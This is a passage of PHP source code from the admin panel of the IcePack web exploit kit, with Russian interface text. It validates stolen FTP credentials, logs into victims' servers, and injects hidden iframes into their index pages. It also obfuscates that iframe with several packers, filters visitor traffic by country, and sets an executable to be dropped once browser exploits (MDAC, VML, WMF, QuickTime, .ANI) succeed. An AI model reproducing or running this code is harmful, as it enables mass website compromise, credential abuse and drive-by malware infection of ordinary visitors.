							$current_prefix = explode ('.', $p_account['serv']);
							
							foreach ($local_prefix as $lp)
							{
								if ($current_prefix[0] == $lp) $bad = true;
							}
					  }
					  
					  $bad_hosts = array ( 'boom.ru', 'narod.ru', 'jino-net.ru', 'fatal.ru',
					  'h10.ru', 'h11.ru', 'h12.ru', 'h13.ru', 'h14.ru', 'h15.ru', 'h16.ru', '110mb.com',
					  'by.ru', 'tripod.com');
					  
					  
					  foreach ($bad_hosts as $host) {
					  	if (preg_match("/".$host."/", $p_account['serv'])) $bad = true;
					  }  
						
						if ($bad) continue;
						
						$account = addslashes("ftp://".$p_account['login'].":".$p_account['pass']."@".$p_account['serv']);
						$db->query("INSERT INTO ftp (data) VALUES ('".$account."');");
						$i++;
					}
					fclose($fp);
					
					if($tmp == "./tmp/ftps") @unlink("./tmp/ftps");
					MessageBox(1, "Импорт FTP успешно завершен\r\nДобавлено аккаунтов: ".$i);
				}
				?>
		  <form method="post" enctype="multipart/form-data">
		  <table border="0" cellspacing="0" cellpadding="10" style="width:90%;" class="tableBorder">
		  	<tr>
		  		<td class="tableHeading" colspan="2">Импорт FTP</td>
		  	</tr>
		  	<tr>
		  		<td class="tableCellTwo" style="width:50%; text-align: right;"><b>Загрузка с компьютера :</b></td>
		  		<td class="tableCellTwo" style="width:50%; text-align: left;"><input type="file" id="tmp" name="file" style="width:100%;"></td>
		  	</tr>
		  	<tr>
		  		<td class="tableCellTwo" style="width:50%; text-align: right;"><b>Загрузка с сервера :</b></td>
		  		<td class="tableCellTwo" style="width:50%; text-align: left;"><input type="text" name="local_file" value="accounts.txt" style="width:100%;"></td>
		  	</tr>
		  	<tr>
		  		<td class="tableCellTwo" colspan="2">
		  			<div class="buttonWrapper" style="text-align: left;"><input type="submit" name="import" value="Начать"></div>
		  		</td>
		  	</tr>
		  </table>
		  </form>
		  <?
			}
			
			// Check //
			if ($sub == "check")
			{
				$sql = $db->query("SELECT id,data FROM ftp WHERE valid=0");
				
				if($db->num_rows($sql) <= 0)
				{
					MessageBox(1, "Все FTP уже проверены");
				}
				?>
		  <form method="post">
		  <table border="0" cellspacing="0" cellpadding="10" style="width:90%;" class="tableBorder">
		  	<tr>
		  		<td class="tableHeading" colspan="2">Проверка FTP</td>
		  	</tr>
		  	<tr>
		  		<td colspan="2" class="tableCellTwo" style="width:99%; text-align: center;"> Нажмите кнопку &quot;Начать&quot; и перейдите к [<a href="check.php" target="_blank">просмотру прогресса</a>]&nbsp;&nbsp;&nbsp;</td>
		  	</tr>
		  	<?
		  	if (isset($_POST['action']))
		  	{
		  		@unlink("tmp/check.txt");
		  		$fo = fopen("tmp/check.txt","a");
		  		
		  		fwrite($fo, "<tr><td colspan=\"3\" class=\"tableCellTwo\" align=\"center\"><b>Начало проверки<b></td></tr>\r\n");
		  		fwrite($fo, "<tr><td colspan=\"3\" class=\"tableCellTwo\" align=\"center\"><b>".date("d.m.Y - H:i:s")."<b></td></tr>\r\n");
		  		
		  		
		  		while($account = $db->get_array($sql))
		  		{
		  			$PR = 0;

		  		$p_account = parse_ftp($account['data']);
		  		
		  		fwrite($fo, "<tr>\r\n");		  		
		  		fwrite($fo, "<td class=\"tableCellTwo\">".$p_account['serv']."</td>");
		  		
		  		fwrite($fo, "<td class=\"tableCellTwo\">");
		  		if ($cid = @ftp_connect($p_account['serv'], 21, 15))
		  		{
		  			if(@ftp_login($cid, $p_account['login'],$p_account['pass']))
		  			{
		  				$db->query("UPDATE ftp SET valid = 1 WHERE id = ".$account['id']);
		  				fwrite($fo, "Рабочий");
		  				$PR = getPR_check($p_account['serv']);
		  			} else { fwrite($fo, "Ошибка"); }
		  				
		  		} else { fwrite($fo, "Ошибка"); }
		  		fwrite($fo, "</td>\r\n");
		  		fwrite($fo, "<td class=\"tableCellTwo\">".$PR."<td>\r\n");
		  		}
		  		fwrite($fo, "</tr>\r\n");
		  		fwrite($fo, "<tr><td colspan=\"3\" class=\"tableCellTwo\" align=\"center\"><b>Проверка завершена<b></td></tr>\r\n");
		  		fwrite($fo, "<tr><td colspan=\"3\" class=\"tableCellTwo\" align=\"center\"><b>".date("d.m.Y - H:i:s")."<b></td></tr>\r\n");
		  		fclose($fo);
		  	}
		  	?>
		  	<tr>
		  		<td class="tableCellTwo" colspan="2">
		  			<div class="buttonWrapper" style="text-align: left;"><input type="submit" name="action" value="Начать"></div>
		  		</td>
		  	</tr>
		  </table>
		  </form>
		  <?
			}
			
			// Inject //
			if ($sub == "inject")
			{
				$sql = $db->query("SELECT id,data FROM ftp WHERE valid = 1");
				
				if($db->num_rows($sql) <= 0)
				{
					MessageBox(1, "Проверенных FTP нет");
				}
			?>
			<form method="post">			
			<table border="0" cellspacing="0" cellpadding="10" style="width:90%;" class="tableBorder">
				<tr>
					<td class="tableHeading" colspan="2">Установка кода</td>
				</tr>
				<?
				if (isset($_POST['action']))
				{
					@unlink("tmp/inject.txt");
		  		$fo = fopen("tmp/inject.txt","a");
		  		
		  		fwrite($fo, "<tr><td colspan=\"3\" class=\"tableCellTwo\" align=\"center\"><b>Начало установки<b></td></tr>\r\n");
		  		fwrite($fo, "<tr><td colspan=\"3\" class=\"tableCellTwo\" align=\"center\"><b>".date("d.m.Y - H:i:s")."<b></td></tr>\r\n");		  		
					
					$method = $_POST['method'];
					$code   = $_POST['code'];
					
					if (isset($_POST['rm_frame'])) $rm_frame = 1; else $rm_frame = 0;
					
					while($account = $db->get_array($sql))
					{
						$RootDir = "";
						$Indexs  = array();
						$WDs     = array();
					
					$p_account = parse_ftp($account['data']);

		  		fwrite($fo, "<tr>\r\n");		  		
		  		fwrite($fo, "<td class=\"tableCellTwo\">".$p_account['serv']."</td>");
		  		
		  		fwrite($fo, "<td class=\"tableCellTwo\">");					
					
					if ($cid = @ftp_connect($p_account['serv'], 21, 15))
					{
						if(@ftp_login($cid, $p_account['login'],$p_account['pass']))
						{
							@ftp_pasv($cid, true);
							$RootDir = @ftp_pwd($cid);
							
							FindIndex($RootDir."/");
							FindWDs  ($RootDir."");
							
							if(count($WDs)==0) $WDs[]="~";
							
							foreach($Indexs as $i)
							{
								changeIndex($i, $code);
							}
							fwrite($fo, "Успешно");
						} else fwrite($fo, "Ошибка");
					} else fwrite($fo, "Ошибка");
					?>
					</td>
				</tr>
				<?
		  		fwrite($fo, "</td>\r\n");
				@unlink("./tmp/data");
					}
		  		fwrite($fo, "<tr><td colspan=\"3\" class=\"tableCellTwo\" align=\"center\"><b>Установка завершена<b></td></tr>\r\n");
		  		fwrite($fo, "<tr><td colspan=\"3\" class=\"tableCellTwo\" align=\"center\"><b>".date("d.m.Y - H:i:s")."<b></td></tr>\r\n");
		  		fclose($fo);					
				}
				?>
	  	    <tr>
		  	    	<td colspan="2" class="tableCellTwo" style="width:99%; text-align: center;"> Введите в окно код вашего iFrame, выберите вариант установки. Затем нажмите кнопку &quot;Начать&quot; и перейдите к [<a href="inject.php" target="_blank">просмотру прогресса</a>]&nbsp;&nbsp;&nbsp;</td>
		  	    </tr>				
				<tr>
					<td class="tableCellOne" colspan="2" align="center"><textarea rows="10" name="code" style="width:99%;"></textarea></td>
				</tr>
				<tr>
					<td class="tableCellTwo" colspan="2" style="text-align: center;"><b>Варианты установки</b></td>
		  	</tr>
		  	<tr>
		  	        <td class="tableCellTwo" style="width:50%; text-align: right;"><b>Запись перед &lt;/body&gt; :</b></td>
		  	        <td class="tableCellTwo" style="width:50%; text-align: left;"><input type="radio" name="method" value="afterbody" style="width:100%;" checked></td>
		  	    </tr>
		  	    <tr>
		  	        <td class="tableCellTwo" style="width:50%; text-align: right;"><b>В конец файла :</b></td>
		  	        <td class="tableCellTwo" style="width:50%; text-align: left;"><input type="radio" name="method" value="attend" style="width:100%;"></td>
		  	    </tr>		  	    
		  	    <tr>
		  	        <td class="tableCellTwo" style="width:50%; text-align: right;"><b>Перезапись файлов :</b></td>
		  	        <td class="tableCellTwo" style="width:50%; text-align: left;"><input type="radio" name="method" value="rewrite" style="width:100%;"></td>
		  	    </tr>		  	    
				<tr>
					<td class="tableCellTwo" colspan="2" style="text-align: center;"><b>Дополнительно</b></td>
		  	</tr>
		  	    <tr>
		  	        <td class="tableCellTwo" style="width:50%; text-align: right;"><b>Удалять фреймы :</b></td>
		  	        <td class="tableCellTwo" style="width:50%; text-align: left;"><input type="checkbox" name="rm_frame" value="1" style="width:100%;"></td>
		  	    </tr>
				<tr>
					<td class="tableCellTwo" colspan="2">
						<div class="buttonWrapper" style="text-align: left;"><input type="submit" name="action" value="Начать"></div>
					</td>
				</tr>
			</table>
			</form>			
			<?
			}
			
			if ($sub == "export")
			{
			  $result = $db->query("SELECT data FROM ftp WHERE valid=1");
			  if ($db->num_rows($result) <= 0)
			  {
					MessageBox(1, "Проверенных FTP нет");
			  }
			  ?>
			    <table border="0" cellspacing="0" cellpadding="10" style="width:90%;" class="tableBorder">
				<tr>
					<td class="tableHeading" colspan="2">Экспорт (Только рабочие)</td>
				</tr>
				<tr>
			    	<td class="tableCellOne" colspan="2" align="center"><textarea rows="15" name="ftps" style="width:99%;"><? while ($row = $db->get_row($result)) echo $row['data']."\r\n"; ?></textarea></td>
				</tr>
				</table>
			  <?	
			}
			
			// Clean //
			if ($sub == "clean")
			{
				if (isset($_POST['type']))
				{
					$type = $_POST['type'];
					
					if ($type == "novalid")
					{
						$db->query("DELETE FROM ftp WHERE valid = 0");
						MessageBox(1, "Все нерабочие FTP удалены");
					}
					
					if ($type == "valid")
					{
						$db->query("DELETE FROM ftp WHERE valid = 1");
						MessageBox(1, "Все рабочие FTP удалены");
					}
					
					if ($type == "all")
					{
						$db->query("DELETE FROM ftp");
						MessageBox(1, "Все FTP удалены");
					}
				}
				?>
			<form method="post" enctype="multipart/form-data">
			<table border="0" cellspacing="0" cellpadding="10" style="width:90%;" class="tableBorder">
			   <tr>
					<td class="tableHeading" colspan="2">Очистка базы данных</td>
				</tr>
					<tr>
						<td class="tableCellTwo" style="width:50%; text-align: right;"><b>Удаление нерабочих FTP :</b></td>
						<td class="tableCellTwo" style="width:50%;"><input type="radio" name="type" value="novalid" style="width:100%;" checked></td>
					</tr>
					<tr>
						<td class="tableCellTwo" style="width:50%; text-align: right;"><b>Удаление рабочих FTP :</b></td>
						<td class="tableCellTwo" style="width:50%;"><input type="radio" name="type" value="valid" style="width:100%;"></td>
					</tr>
					<tr>
						<td class="tableCellTwo" style="width:50%; text-align: right;"><b>Удаление всех FTP :</b></td>
						<td class="tableCellTwo" style="width:50%;"><input type="radio" name="type" value="all" style="width:100%;"></td>
					</tr>
					<tr>
						<td class="tableCellTwo" colspan="2">
							<div class="buttonWrapper" style="text-align: left;"><input type="submit" name="action" value="Начать"></div>
						</td>
					</tr>
			</table>
			</form>
			<?
			}
		}
		
		/*
		@TC
		*/
		
		if ($do == 'traffic')
		{
			$GEOIP_COUNTRY_CODES = array(
				"AP", "EU", "AD", "AE", "AF", "AG", "AI", "AL", "AM", "AN", "AO", "AQ", "AR",
				"AS", "AT", "AU", "AW", "AZ", "BA", "BB", "BD", "BE", "BF", "BG", "BH", "BI",
				"BJ", "BM", "BN", "BO", "BR", "BS", "BT", "BV", "BW", "BY", "BZ", "CA", "CC",
				"CD", "CF", "CG", "CH", "CI", "CK", "CL", "CM", "CN", "CO", "CR", "CU", "CV",
				"CX", "CY", "CZ", "DE", "DJ", "DK", "DM", "DO", "DZ", "EC", "EE", "EG", "EH",
				"ER", "ES", "ET", "FI", "FJ", "FK", "FM", "FO", "FR", "FX", "GA", "GB", "GD",
				"GE", "GF", "GH", "GI", "GL", "GM", "GN", "GP", "GQ", "GR", "GS", "GT", "GU",
				"GW", "GY", "HK", "HM", "HN", "HR", "HT", "HU", "ID", "IE", "IL", "IN", "IO",
				"IQ", "IR", "IS", "IT", "JM", "JO", "JP", "KE", "KG", "KH", "KI", "KM", "KN",
				"KP", "KR", "KW", "KY", "KZ", "LA", "LB", "LC", "LI", "LK", "LR", "LS", "LT",
				"LU", "LV", "LY", "MA", "MC", "MD", "MG", "MH", "MK", "ML", "MM", "MN", "MO",
				"MP", "MQ", "MR", "MS", "MT", "MU", "MV", "MW", "MX", "MY", "MZ", "NA", "NC",
				"NE", "NF", "NG", "NI", "NL", "NO", "NP", "NR", "NU", "NZ", "OM", "PA", "PE",
				"PF", "PG", "PH", "PK", "PL", "PM", "PN", "PR", "PS", "PT", "PW", "PY", "QA",
				"RE", "RO", "RU", "RW", "SA", "SB", "SC", "SD", "SE", "SG", "SH", "SI", "SJ",
				"SK", "SL", "SM", "SN", "SO", "SR", "ST", "SV", "SY", "SZ", "TC", "TD", "TF",
				"TG", "TH", "TJ", "TK", "TM", "TN", "TO", "TL", "TR", "TT", "TV", "TW", "TZ",
				"UA", "UG", "UM", "US", "UY", "UZ", "VA", "VC", "VE", "VG", "VI", "VN", "VU",
				"WF", "WS", "YE", "YT", "RS", "ZA", "ZM", "ME", "ZW", "A1", "A2", "O1", "AX",
				"GG", "IM", "JE" );

				$GEOIP_COUNTRY_NAMES = array(
				"Asia/Pacific Region", "Europe", "Andorra", "United Arab Emirates", "Afghanistan",
				"Antigua and Barbuda", "Anguilla", "Albania", "Armenia", "Netherlands Antilles",
				"Angola", "Antarctica", "Argentina", "American Samoa", "Austria", "Australia",
				"Aruba", "Azerbaijan", "Bosnia and Herzegovina", "Barbados", "Bangladesh",
				"Belgium", "Burkina Faso", "Bulgaria", "Bahrain", "Burundi", "Benin", "Bermuda",
				"Brunei Darussalam", "Bolivia", "Brazil", "Bahamas", "Bhutan", "Bouvet Island",
				"Botswana", "Belarus", "Belize", "Canada", "Cocos (Keeling) Islands",
				"Congo, The Democratic Republic of the", "Central African Republic",
				"Congo", "Switzerland", "Cote D'Ivoire", "Cook Islands", "Chile", "Cameroon",
				"China", "Colombia", "Costa Rica", "Cuba", "Cape Verde", "Christmas Island",
				"Cyprus", "Czech Republic", "Germany", "Djibouti", "Denmark", "Dominica",
				"Dominican Republic", "Algeria", "Ecuador", "Estonia", "Egypt", "Western Sahara",
				"Eritrea", "Spain", "Ethiopia", "Finland", "Fiji", "Falkland Islands (Malvinas)",
				"Micronesia, Federated States of", "Faroe Islands", "France", "France, Metropolitan",
				"Gabon", "United Kingdom", "Grenada", "Georgia", "French Guiana", "Ghana", "Gibraltar",
				"Greenland", "Gambia", "Guinea", "Guadeloupe", "Equatorial Guinea", "Greece",
				"South Georgia and the South Sandwich Islands", "Guatemala", "Guam", "Guinea-Bissau",
				"Guyana", "Hong Kong", "Heard Island and McDonald Islands", "Honduras", "Croatia",
				"Haiti", "Hungary", "Indonesia", "Ireland", "Israel", "India", "British Indian Ocean Territory",
				"Iraq", "Iran, Islamic Republic of", "Iceland", "Italy", "Jamaica", "Jordan", "Japan",
				"Kenya", "Kyrgyzstan", "Cambodia", "Kiribati", "Comoros", "Saint Kitts and Nevis",
				"Korea, Democratic People's Republic of", "Korea, Republic of", "Kuwait", "Cayman Islands",
				"Kazakstan", "Lao People's Democratic Republic", "Lebanon", "Saint Lucia", "Liechtenstein",
				"Sri Lanka", "Liberia", "Lesotho", "Lithuania", "Luxembourg", "Latvia", "Libyan Arab Jamahiriya",
				"Morocco", "Monaco", "Moldova, Republic of", "Madagascar", "Marshall Islands", "Macedonia", 
				"Mali", "Myanmar", "Mongolia", "Macau", "Northern Mariana Islands", "Martinique", "Mauritania",
				"Montserrat", "Malta", "Mauritius", "Maldives", "Malawi", "Mexico", "Malaysia", "Mozambique",
				"Namibia", "New Caledonia", "Niger", "Norfolk Island", "Nigeria", "Nicaragua", "Netherlands", "Norway",
				"Nepal", "Nauru", "Niue", "New Zealand", "Oman", "Panama", "Peru", "French Polynesia", "Papua New Guinea",
				"Philippines", "Pakistan", "Poland", "Saint Pierre and Miquelon", "Pitcairn Islands", "Puerto Rico",
				"Palestinian Territory", "Portugal", "Palau", "Paraguay", "Qatar", "Reunion", "Romania", "Russian Federation",
				"Rwanda", "Saudi Arabia", "Solomon Islands", "Seychelles", "Sudan", "Sweden", "Singapore", "Saint Helena",
				"Slovenia", "Svalbard and Jan Mayen", "Slovakia", "Sierra Leone", "San Marino", "Senegal", "Somalia",
				"Suriname", "Sao Tome and Principe", "El Salvador", "Syrian Arab Republic", "Swaziland",
				"Turks and Caicos Islands", "Chad", "French Southern Territories", "Togo", "Thailand", "Tajikistan",
				"Tokelau", "Turkmenistan", "Tunisia", "Tonga", "Timor-Leste", "Turkey", "Trinidad and Tobago", "Tuvalu",
				"Taiwan", "Tanzania, United Republic of", "Ukraine", "Uganda", "United States Minor Outlying Islands",
				"United States", "Uruguay", "Uzbekistan", "Holy See (Vatican City State)", "Saint Vincent and the Grenadines",
				"Venezuela", "Virgin Islands, British", "Virgin Islands, U.S.", "Vietnam", "Vanuatu", "Wallis and Futuna",
				"Samoa", "Yemen", "Mayotte", "Serbia", "South Africa", "Zambia", "Montenegro", "Zimbabwe", "Anonymous Proxy",
				"Satellite Provider","Other", "Aland Islands","Guernsey","Isle of Man","Jersey"
				);

			// Сохранение поведения
			if (isset($_POST['action']))
			{
				$total = '';

				$db->query("UPDATE config SET value = '".$_POST['behavior']."' WHERE vkey = 'behavior'");
				
				MessageBox(1, "Настройки сохранены");
			}
			
			// Добавление страны
			if (isset($_POST['add_country']))
			{
				$sql = $db->query("SELECT value FROM config WHERE vkey = 'countries'");
				$value = $db->get_row($sql);
				$value = $value['value'];
				
				$final = $value.$_POST['country'].',';

				$db->query("UPDATE config SET value ='".$final."' WHERE vkey = 'countries'");
			}
			
			// Очистка
			if (isset($_POST['clear']))
			{
				$db->query("UPDATE config SET value = '' WHERE vkey = 'countries'");
			}
			
			$result = $db->query("SELECT value FROM config WHERE vkey='behavior'");
			$row = $db->get_array($result);			
			$behavior = $row['value'];
			?>
			<form method="post">
			<table border="0" cellspacing="0" cellpadding="10" style="width:90%;" class="tableBorder">
			   <tr>
					<td class="tableHeading" colspan="2">Управление трафиком</td>
				</tr>
				<tr>
					<td class="tableCellTwo" style="width:50%; text-align: right;"><b>Поведение <?=ShowHelp("<b>Блокировать</b> - пропускается любой трафик, кроме отмеченных стран.<br><b>Разрешать</b> - блокируется весь трафик, кроме отмеченных стран.<br><br>Заблокированный траффик считается мусорным и сливается по указанному в настройках url.");?> :</b></td>
					<td class="tableCellTwo" style="width:50%; text-align: left;">
						<select name="behavior">
						<?
						if ($behavior == 'allow')
						{
							?>
							<option value="allow" selected>Разрешать</option>
							<option value="block">Блокировать</option>
							<?
						}
						else
						{
							?>
							<option value="block" selected>Блокировать</option>
							<option value="allow">Разрешать</option>
							<?
						}
						?>
						</select>
						<input type="submit" name="action" value="Сохранить">
					</td>
				</tr>
				<tr>
					<td class="tableCellTwo" style="width:50%; text-align: right;"><b>Страна :</b></td>
					<td class="tableCellTwo" style="width:50%; text-align: left;">
						<select name="country">
						<?
						$i = 0;
						foreach ($GEOIP_COUNTRY_CODES as $code)
						{
							echo "<option value=\"".$code."\">".$GEOIP_COUNTRY_NAMES[$i]."</option>\r\n";
							$i++;
						}
						?>
						</select>
						<input type="submit" name="add_country" value="Добавить">
					</td>
				</tr>
				<tr>
					<td class="tableCellTwo" style="text-align: right;"><b>Текущие страны</b></td>
					<td class="tableCellTwo" style="text-align: right;"><input type="submit" name="clear" value="Очистить"></td>
				</tr>
					
						<?
						$sql   = $db->query("SELECT value FROM config WHERE vkey='countries'");
						$row   = $db->get_row($sql);
						$data  = $row['value'];
						$total = explode (',', $data);
						?>

						<?
						if (empty($total[0])) echo '<td class="tableCellTwo" colspan="2" style="text-align: center;"><b>Добавьте страну</b></td>';
						foreach ($total as $data)
						{
							if(!empty($data))
							{
							?>
							<tr>
							<td class="tableCellTwo" style="width:50%; text-align: right;"><?=$code_to_name[$data];?></td>
							<td class="tableCellTwo" style="width:50%; text-align: left;">
							<?
							$code = strtolower($data);
							$tag  = '<img src="flags/'.$code.'.png">';
							
							$img = (file_exists('flags/'.$code.'.png')) ? '<img src="flags/'.$code.'.png">' : '<img src="flags/unknown.png">';
							echo $img;
							?>
						  </tr>
							<?
							}
						}
						?>
			</table>
		</form>
			<?
		}
		
		/*
		@IFrame
		*/

		if ($do == 'iframe')
		{
			include('crupt.php');
			$iframe = '<iframe src="'.$config['main_url'].'/index.php" width=1 height=1 style="display:none"></iframe>';
			$crupted = firepack0_18_encrypt($iframe);
			$crupted2 = icepack_encrypt($iframe);
			$crupted3 = _obfuscate_IGNfandp($iframe);
			$crupted4 = _obfuscate_MGs1Kno2($iframe);
			$crupted5 = gpackencode($iframe);
			?>
			<table border="0" cellspacing="0" cellpadding="10" style="width:90%;" class="tableBorder">
			   <tr>
			      <td class="tableHeading" colspan="2">Код iFrame</td>
			   </tr>
			   
			   <tr>
			      <td colspan="2" class="tableCellTwo" style="text-align: center;">Level 0</td>
			   </tr>
			   <tr>
			      <td colspan="2" class="tableCellTwo" style="width:50%; text-align: center;">
			      	<textarea rows="4" style="width:99%;"><?=$iframe;?></textarea>
			      </td>
			   </tr>
			   
			   <tr>
			      <td colspan="2" class="tableCellTwo" style="text-align: center;">Level 2 (FirePack 0.18)</td>
			   </tr>
			   <tr>
			      <td colspan="2" class="tableCellTwo" style="width:50%; text-align: center;">
			      	<textarea rows="4" style="width:99%;"><?=$crupted;?></textarea>
			      </td>
			   </tr>
			   
			   <tr>
			      <td colspan="2" class="tableCellTwo" style="text-align: center;">Level 2 (IcePack)</td>
			   </tr>
			   <tr>
			      <td colspan="2" class="tableCellTwo" style="width:50%; text-align: center;">
			      	<textarea rows="4" style="width:99%;"><?=$crupted2;?></textarea>
			      </td>
			   </tr>
			   
			   <tr>
			      <td colspan="2" class="tableCellTwo" style="text-align: center;">Level 3 (IcePack)</td>
			   </tr>
			   <tr>
			      <td colspan="2" class="tableCellTwo" style="width:50%; text-align: center;">
			      	<textarea rows="4" style="width:99%;"><?=$crupted3;?></textarea>
			      </td>
			   </tr>
			   
			   <tr>
			      <td colspan="2" class="tableCellTwo" style="text-align: center;">TORNADO Crupt</td>
			   </tr>
			   <tr>
			      <td colspan="2" class="tableCellTwo" style="width:50%; text-align: center;">
			      	<textarea rows="4" style="width:99%;"><?=$crupted4;?></textarea>
			      </td>
			   </tr>
			   
			   <tr>
			      <td colspan="2" class="tableCellTwo" style="text-align: center;">Gpack Crupt (Simple)</td>
			   </tr>
			   <tr>
			      <td colspan="2" class="tableCellTwo" style="width:50%; text-align: center;">
			      	<textarea rows="4" style="width:99%;"><?=$crupted5;?></textarea>
			      </td>
			   </tr>
			   
			</table>
			<?
		}
		
		/*
		@Settings
		*/
		
		if ($do == 'settings')
		{		

			if(isset($_POST['save']))
			{
				if(is_uploaded_file($_FILES['file']['tmp_name']))
				{
					@copy($_FILES['file']['tmp_name'],"../load/file.exe");
					$file = "../load/file.exe";
				}
				
				$find[]    = "'\r'";
				$replace[] = "";
				$find[]    = "'\n'";
				$replace[] = "";
				
				$handler = fopen('../config.php', "w");
				
				fwrite($handler, "<?php\n\n\$config = array (\r\n");
				
				foreach($_POST['conf'] as $name => $value)
				{
					$value = trim(stripslashes ($value));
					$value = htmlspecialchars ($value, ENT_QUOTES);
					$value = preg_replace($find,$replace,$value);
					fwrite($handler, "'{$name}' => \"{$value}\",\r\n");
				}
				
				for ($i=1; $i<17; $i++)
				{
					if (isset($_POST['spl'.$i]) and $_POST['spl'.$i] == 'on')
					{ $value = 'on'; } else { $value = 'off'; }
					fwrite($handler, "'spl".$i."' => \"{$value}\",\r\n");						
				}
					
				fwrite($handler, ");\n\n?>");
				fclose($handler);
				
				MessageBox(1, "Настройки успешно изменены");
			}

			?>
			<form method="post" enctype="multipart/form-data">
			<table border="0" cellspacing="0" cellpadding="10" style="width:90%;" class="tableBorder">
			   <tr>
			      <td class="tableHeading" colspan="2">Настройки</a></td>
			   </tr>
			   <tr>
			      <td class="tableCellTwo" style="width:50%; text-align: right;"><b>URL скрипта <?=ShowHelp("URL до папки, в которую установлен IcePack (без знака / на конце).<br><b>Пример:</b> http://www.example.com");?> :</b></td>
			      <td class="tableCellTwo" style="width:50%; text-align: left;"><input type="text" name="conf[main_url]" value="<?=$config['main_url'];?>" style="width: 100%;"></td>
			   </tr>
			   <tr>
			      <td class="tableCellTwo" style="width:50%; text-align: right;"><b>URL для слива: <?=ShowHelp("URL для слива неуников и заблокированного ТДСкой трафика");?> :</b></td>
			      <td class="tableCellTwo" style="width:50%; text-align: left;"><input type="text" name="conf[trash_url]" value="<?=$config['trash_url'];?>" style="width: 100%;"></td>
			   </tr>			   
			   <tr>
			      <td class="tableCellTwo" style="width:50%; text-align: right;"><b>Имя пользователя <?=ShowHelp("Имя пользователя, необходимое для входа в панель управления.");?> :</b></td>
			      <td class="tableCellTwo" style="width:50%; text-align: left;"><input type="text" name="conf[admin_name]" value="<?=$config['admin_name'];?>" style="width: 100%;"></td>
			   </tr>
			   <tr>
			      <td class="tableCellTwo" style="width:50%; text-align: right;"><b>Пароль пользователя :</b></td>
			      <td class="tableCellTwo" style="width:50%; text-align: left;"><input type="text" name="conf[admin_pass]" value="<?=$config['admin_pass'];?>" style="width: 100%;"></td>
			   </tr>
			   <tr>
			      <td class="tableCellTwo" style="width:50%; text-align: right;"><b>Файл для загрузки <?=ShowHelp("Данный файл будет загружаться при успешной работе эксплойтов.");?> :</b></td>
			      <td class="tableCellTwo" style="width:50%; text-align: left;"><input type="file" name="file" style="width:100%;"></td>
			   </tr>
			   <tr>
			     <td class="tableCellTwo" style="width:100%; text-align: center;" colspan="2">Используемые эксплоиты:</td>
			   </tr>
			   <tr>
			     <td class="tableCellTwo" style="width:50%; text-align: right;">
				   <b>MSIE 6:</b>
				 </td>
				 <td class="tableCellTwo" style="width:50%; text-align: left;">
				   <input type="checkbox" name="spl1" <? if($config['spl1']=='on'){echo 'CHECKED';} ?> >MDAC (RDS)</input>
				   <input type="checkbox" name="spl9" <? if($config['spl9']=='on'){echo 'CHECKED';} ?> >Zenturi</input>
				   <input type="checkbox" name="spl12" <? if($config['spl12']=='on'){echo 'CHECKED';} ?> >XML Core Services</input>
				   <input type="checkbox" name="spl3" <? if($config['spl3']=='on'){echo 'CHECKED';} ?> >VML</input>
				   <input type="checkbox" name="spl2" <? if($config['spl2']=='on'){echo 'CHECKED';} ?> >WVFI SetSlice</input>
				 </td>
			   </tr>
			   <tr>
			     <td class="tableCellTwo" style="width:50%; text-align: right;">&nbsp;</td>
				 <td class="tableCellTwo" style="width:50%; text-align: left;">
				   <input type="checkbox" name="spl10" <? if($config['spl10']=='on'){echo 'CHECKED';} ?> >Yahoo Webcam</input>
				   <input type="checkbox" name="spl8" <? if($config['spl8']=='on'){echo 'CHECKED';} ?> >WinZip</input>
				   <input type="checkbox" name="spl7" <? if($config['spl7']=='on'){echo 'CHECKED';} ?> >QuickTime</input>
				   <input type="checkbox" name="spl4" <? if($config['spl4']=='on'){echo 'CHECKED';} ?> >MS06-044</input>
				   <input type="checkbox" name="spl15" <? if($config['spl15']=='on'){echo 'CHECKED';} ?> >Java bytecode(*)</input>				 
			     </td>
			   </tr>			   
			   <tr>
			     <td class="tableCellTwo" style="width:50%; text-align: right;">
				   <b>MSIE 7:</b>
				 </td>
				 <td class="tableCellTwo" style="width:50%; text-align: left;">
				   <input type="checkbox" name="spl16" <? if($config['spl16']=='on'){echo 'CHECKED';} ?> >x16</input>
				 </td>
		       </tr>
			   <tr>
			     <td class="tableCellTwo" style="width:50%; text-align: right;">
				   <b>FireFox:</b>
				 </td>
				 <td class="tableCellTwo" style="width:50%; text-align: left;">
				   <input type="checkbox" name="spl5" <? if($config['spl5']=='on'){echo 'CHECKED';} ?> >WMF Firefox</input>
				 </td>
		       </tr>
			   <tr>
			     <td class="tableCellTwo" style="width:50%; text-align: right;">
				   <b>Opera 9-9.20:</b>
				 </td>
				 <td class="tableCellTwo" style="width:50%; text-align: left;">
				   <input type="checkbox" name="spl6" <? if($config['spl6']=='on'){echo 'CHECKED';} ?> >Opera 9-9.20</input>
				 </td>
		       </tr>
			   <tr>
			     <td class="tableCellTwo" style="width:50%; text-align: right;">
				   <b>Opera 7:</b>
				 </td>
				 <td class="tableCellTwo" style="width:50%; text-align: left;">
				   <input type="checkbox" name="spl16" <? if($config['spl16']=='on'){echo 'CHECKED';} ?> >.ANI(*)</input>
				 </td>
			   </tr>			   			   			   
				<tr>
					<td class="tableCellTwo" colspan="2">
						<div class="buttonWrapper" style="text-align: left;"><input type="submit" name="save" value="Сохранить">
						</div>
					</td>
				</tr>
			</table>
			<center><b>*</b> - For all browsers</center>
			</form>
			<?
		}
		?>
		</div>
		<?
		ShowCopyright();
		?>
</body>
</html>
<!-- IcePack (c) IDT 2007 and BlackSun 2008-->
